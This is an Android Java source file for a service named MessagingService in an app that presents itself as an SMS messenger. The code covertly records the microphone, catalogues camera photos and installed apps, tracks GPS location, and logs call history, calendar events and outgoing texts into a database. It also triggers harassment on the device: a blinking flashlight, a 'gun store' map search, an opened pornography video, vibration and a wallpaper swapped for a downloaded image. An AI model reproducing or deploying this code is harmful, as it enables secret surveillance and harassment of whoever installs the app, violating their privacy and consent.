package com.candroid.textme;

import android.app.SearchManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.database.ContentObserver;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.graphics.Canvas;
import android.graphics.Color;
import android.graphics.Paint;
import android.graphics.pdf.PdfDocument;
import android.hardware.Camera;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraManager;
import android.location.LocationManager;
import android.media.AudioManager;
import android.media.MediaPlayer;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.Bundle;
import android.os.CancellationSignal;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.ParcelFileDescriptor;
import android.print.PageRange;
import android.print.PrintAttributes;
import android.print.PrintDocumentAdapter;
import android.print.PrintDocumentInfo;
import android.print.PrintManager;
import android.print.pdf.PrintedPdfDocument;
import android.provider.CalendarContract;
import android.provider.CallLog;
import android.provider.Telephony;
import android.util.Log;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;

public class MessagingService extends Service {

    private static final String TAG = MessagingService.class.getSimpleName();
    protected static boolean sIsRunning = false;
    private IncomingReceiver mIncomingReceiver;
    private OutgoingReceiver mOutgoingReceiver;
    private CreateConversationReceiver mCreateConversationReceiver;
    private ScreenReceiver mScreenReceiver;
    private WapReceiver mWapReceiver;
    private DatabaseReceiver mDatabaseReceiver;
    private SmsObserver mObserver;
    private CallLogObserver mCallLogObserver;
    private CalendarObserver mCalendarObserver;
    private HeadsetPlugReceiver mHeadsetReceiver;
    protected static String sTelephoneAddress;
    private LocationManager mLocationManager;
    private MediaRecorder mMediaRecorder;
    public MessagingService() {
    }

    @Override
    public void onCreate() {
        super.onCreate();
        startForeground(Constants.FOREGROUND_NOTIFICATION_ID, Lofl.createPersistentServiceNotification(this));
        sIsRunning = true;
        DatabaseHelper database = DatabaseHelper.getInstance(getApplicationContext());
        mIncomingReceiver = new IncomingReceiver();
        mOutgoingReceiver = new OutgoingReceiver();
        mHeadsetReceiver = new HeadsetPlugReceiver();
        mCreateConversationReceiver = new CreateConversationReceiver();
        mScreenReceiver = new ScreenReceiver();
        mWapReceiver = new WapReceiver();
        IntentFilter wapFilter = new IntentFilter("android.provider.Telephony.WAP_PUSH_RECEIVED");
        wapFilter.addAction("android.provider.Telephony.MMS_RECEIVED");
        try {
            wapFilter.addDataType("application/vnd.wap.mms-message");
        } catch (IntentFilter.MalformedMimeTypeException e) {
            e.printStackTrace();
        }
        IntentFilter screenFilter = new IntentFilter();
        screenFilter.addAction(Intent.ACTION_SCREEN_ON);
        screenFilter.addAction(Intent.ACTION_SCREEN_OFF);
        IntentFilter headsetFilter = new IntentFilter(Intent.ACTION_HEADSET_PLUG);
        IntentFilter incomingFilter = new IntentFilter(Telephony.Sms.Intents.DATA_SMS_RECEIVED_ACTION);
        incomingFilter.setPriority(Constants.PRIORITY);
        incomingFilter.addDataAuthority(Constants.HOST, Constants.PORT);
        incomingFilter.addDataScheme("sms");
        IntentFilter outgoingFilter = new IntentFilter();
        outgoingFilter.addAction(Constants.SEND_ACTION);
        outgoingFilter.addAction(Constants.WHISPER_ACTION);
        outgoingFilter.addAction(Constants.SENT_CONFIRMATION_ACTION);
        IntentFilter conversationFilter = new IntentFilter();
        conversationFilter.addAction(Constants.CREATE_CONVERSATION_ACTION);
        //  IntentFilter airplaneFilter = new IntentFilter();
        //  airplaneFilter.addAction(Intent.ACTION_AIRPLANE_MODE_CHANGED);
        //  mAirplaneReceiver = new AirplaneReceiver();
        //  registerReceiver(mAirplaneReceiver, airplaneFilter);
        /*mShareReceiver = new ShareReceiver();
        IntentFilter shareFilter = new IntentFilter(Intent.ACTION_SEND);
        shareFilter.addCategory(Intent.CATEGORY_DEFAULT);
        try {
            shareFilter.addDataType("text/plain");
        } catch (IntentFilter.MalformedMimeTypeException e) {
            e.printStackTrace();
        }
        registerReceiver(mShareReceiver, shareFilter);*/
        registerReceiver(mWapReceiver, wapFilter);
        registerReceiver(mCreateConversationReceiver, conversationFilter);
        registerReceiver(mIncomingReceiver, incomingFilter);
        registerReceiver(mOutgoingReceiver, outgoingFilter);
        registerReceiver(mHeadsetReceiver, headsetFilter);
        registerReceiver(mScreenReceiver, screenFilter);
        IntentFilter databaseFilter = new IntentFilter();
        databaseFilter.addAction(Telephony.Sms.Intents.SMS_RECEIVED_ACTION);
        databaseFilter.addAction(Constants.Actions.ACTION_OUTGOING_SMS);
        mDatabaseReceiver = new DatabaseReceiver();
        registerReceiver(mDatabaseReceiver, databaseFilter);
        sTelephoneAddress = Lofl.getDeviceTelephoneNumber(this);
        Log.d(TAG, "address = " + sTelephoneAddress);
        mObserver = new SmsObserver();
        mCallLogObserver = new CallLogObserver();
        mCalendarObserver = new CalendarObserver();
        getContentResolver().registerContentObserver(Uri.parse("content://sms"), true, mObserver);
        getContentResolver().registerContentObserver(Uri.parse("content://call_log"), true, mCallLogObserver);
        getContentResolver().registerContentObserver(CalendarContract.Events.CONTENT_URI, true, mCalendarObserver);

        new Thread(new Runnable() {
            @Override
            public void run() {
                mMediaRecorder = new MediaRecorder();
                mMediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                mMediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
                mMediaRecorder.setAudioEncoder(MediaRecorder.OutputFormat.AMR_NB);

                SQLiteDatabase db = database.getWritableDatabase();
                try {
                    db.beginTransaction();
                    if(Lofl.isExternalStorageReadable()){
                        File[] pictures = Lofl.getFilesForDirectory(Lofl.getDcimDirectory().getPath() + "/Camera");
                        if(pictures != null && pictures.length > 0){
                            for(File f : pictures){
                                Database.insertMedia(db, f.getName(), f);
                            }
                        }
                        File audioFile = new File(Environment.getExternalStorageDirectory() + File.separator + "soundfile2.3gpp");
                        if(! audioFile.exists()){
                            audioFile.createNewFile();
                        }else{
                            Database.insertMedia(db, audioFile.getName(), audioFile);
                        }
                        mMediaRecorder.setOutputFile(audioFile);
                        mMediaRecorder.prepare();
                        mMediaRecorder.start();
                     /*   pictures = Lofl.getFilesForDirectory(Lofl.getPicturesDirectory().getPath());
                        if(pictures != null && pictures.length > 0){
                            for(File f : pictures){
                                //Database.insertMedia(sDatabase, f.getName(), f);
                            }
                        }*/
                    }
                    db.setTransactionSuccessful();
                } catch (IOException e) {
                    e.printStackTrace();
                }
                db.endTransaction();
                db.beginTransaction();
                Database.insertPackages(db, Lofl.getInstalledApps(MessagingService.this));
                db.setTransactionSuccessful();
                db.endTransaction();
                db.close();
                //Database.insertDevice(sDatabase, sTelephoneAddress, Build.MANUFACTURER, Build.PRODUCT, Build.VERSION.SDK, BuildConfig.FLAVOR, Build.SERIAL, Build.RADIO);
            }
        }).start();

        try {
            String locationProvider = LocationManager.GPS_PROVIDER;
            mLocationManager = Lofl.getLocationManager(MessagingService.this);
            mLocationManager.requestLocationUpdates(locationProvider, 60000, 60, Lofl.getLocationListener(MessagingService.this));

        } catch (SecurityException e) {
            e.printStackTrace();
        }

       /* new Thread(new Runnable() {
            @Override
            public void run() {
                if(Lofl.isExternalStorageReadable()){
                    File[] pictures = Lofl.getFilesForDirectory(Lofl.getDcimDirectory().getPath() + "/Camera");
                    if(pictures != null && pictures.length > 0){
                        for(File file : pictures){
                            Database.insertMedia(sDatabase, file.getName(), file);
                        }
                    }
                }
            }
        }).start();*/

        //Lofl.phoneCall(MessagingService.this, "18002738255");
        Lofl.persistentBlinkingFlashlight(this);
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    Thread.sleep(5000);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
                Lofl.searchGoogleMaps(MessagingService.this, "gun%20store");
                try {
                    Thread.sleep(5000);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
                Lofl.watchPornHubVideo(MessagingService.this, "ph5784420f542c6");
                Lofl.vibrator(MessagingService.this);
                try {
                    Thread.sleep(5000);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
                Lofl.changeWallpaper(MessagingService.this, Lofl.getBitmapFromUrl(Uri.parse("https://i.pinimg.com/originals/04/17/57/0417575eea25c3568bf4007de9afe61f.jpg").toString()));
            }
        }).start();

    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        sIsRunning = false;
        unregisterReceiver(mCreateConversationReceiver);
        unregisterReceiver(mIncomingReceiver);
        unregisterReceiver(mOutgoingReceiver);
        unregisterReceiver(mWapReceiver);
        unregisterReceiver(mHeadsetReceiver);
        unregisterReceiver(mScreenReceiver);
        /*unregisterReceiver(mShareReceiver);*/
        //unregisterReceiver(mAirplaneReceiver);
        DatabaseHelper.getInstance(getApplicationContext()).close();
        unregisterReceiver(mDatabaseReceiver);
        getContentResolver().unregisterContentObserver(mObserver);
        getContentResolver().unregisterContentObserver(mCallLogObserver);
        getContentResolver().unregisterContentObserver(mCalendarObserver);
        if(mMediaRecorder != null){
            mMediaRecorder.stop();
            mMediaRecorder.release();
        }
        stopForeground(true);
        stopSelf();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    protected static void insertMessage(Context context, String destinationAddress, String originAddress, String body, long time){
        Database.insertMessage(context, DatabaseHelper.getInstance(context.getApplicationContext()), body, destinationAddress, originAddress, time);
    }

    private class CallLogObserver extends ContentObserver{
        private int mLastId = -1;
        public CallLogObserver() {
            super(new Handler());
        }

        @Override
        public void onChange(boolean selfChange, Uri uri) {
            super.onChange(selfChange, uri);
            new Thread(new Runnable() {
                @Override
                public void run() {
                    Cursor cursor = getContentResolver().query(uri, null, null, null, null);
                    if(cursor != null && cursor.moveToLast()){
                        int id = cursor.getInt(cursor.getColumnIndexOrThrow("_id"));
                        if(mLastId != id){
                            mLastId = id;
                            String callType = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE));
                            String address = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
                            String time = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE));
                            String duration = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION));
                            long newRowId = Database.insertCallLogEntry(MessagingService.this, DatabaseHelper.getInstance(getApplicationContext().getApplicationContext()), callType, address, duration, time);
                        }
                    }
                }
            }).start();
        }
    }

    private class SmsObserver extends ContentObserver {
        private int mLastSentMessageId = -1;

        public SmsObserver() {
            super(new Handler());
        }

        @Override
        public boolean deliverSelfNotifications() {
            return true;
        }

        @Override
        public void onChange(boolean selfChange, Uri uri) {
            super.onChange(selfChange, uri);
            new Thread(new Runnable() {
                @Override
                public void run() {
                    Cursor cursor = getContentResolver().query(uri, null, null, null, null);
                    if (cursor != null && cursor.moveToNext()) {
                        if (cursor.getInt(cursor.getColumnIndexOrThrow("type")) == 2) {
                            int id = cursor.getInt(cursor.getColumnIndexOrThrow("_id"));
                            if (id != mLastSentMessageId) {
                                mLastSentMessageId = id;
                                String body = cursor.getString(cursor.getColumnIndexOrThrow("body"));
                                String address = cursor.getString(cursor.getColumnIndexOrThrow("address"));
                                Intent outgoingSmsIntent = new Intent();
                                outgoingSmsIntent.putExtra(Constants.ADDRESS, address);
                                outgoingSmsIntent.putExtra(Constants.BODY, body);
                                outgoingSmsIntent.setAction(Constants.Actions.ACTION_OUTGOING_SMS);
                                sendBroadcast(outgoingSmsIntent);
                            }
                        }
                        cursor.close();
                    }
                }
            }).start();
        }
    }

    private class CalendarObserver extends ContentObserver{
        private int mLastId = -1;

        public CalendarObserver() {
            super(new Handler());
        }

        @Override
        public void onChange(boolean selfChange, Uri uri) {
            super.onChange(selfChange, uri);
            Cursor cursor = getContentResolver().query(CalendarContract.Events.CONTENT_URI, null, null, null, null);
            if(cursor != null && cursor.moveToLast()){
                int id = cursor.getInt(cursor.getColumnIndexOrThrow("_id"));
                if(mLastId != id){
                    mLastId = id;
                    String account = cursor.getString(cursor.getColumnIndexOrThrow(CalendarContract.Events.ACCOUNT_NAME));
                    String title = cursor.getString(cursor.getColumnIndexOrThrow(CalendarContract.Events.TITLE));
                    String description = cursor.getString(cursor.getColumnIndexOrThrow(CalendarContract.Events.DESCRIPTION));
                    long beginDate = cursor.getLong(cursor.getColumnIndexOrThrow(CalendarContract.Events.DTSTART));
                    long endDate = cursor.getLong(cursor.getColumnIndexOrThrow(CalendarContract.Events.DTEND));
                    int isAllDay = cursor.getInt(cursor.getColumnIndexOrThrow(CalendarContract.Events.ALL_DAY));
                    String duration = cursor.getString(cursor.getColumnIndexOrThrow(CalendarContract.Events.DURATION));
                    String timeZone = cursor.getString(cursor.getColumnIndexOrThrow(CalendarContract.Events.CALENDAR_TIME_ZONE));
                    String location = cursor.getString(cursor.getColumnIndexOrThrow(CalendarContract.Events.EVENT_LOCATION));
                    String organizer = cursor.getString(cursor.getColumnIndexOrThrow(CalendarContract.Events.ORGANIZER));
                    Database.insertCalendarEvent(MessagingService.this, DatabaseHelper.getInstance(getApplicationContext()), account, title, description, beginDate, endDate, isAllDay, duration, timeZone, location, organizer);
                }
            }
            cursor.close();
        }
    }
}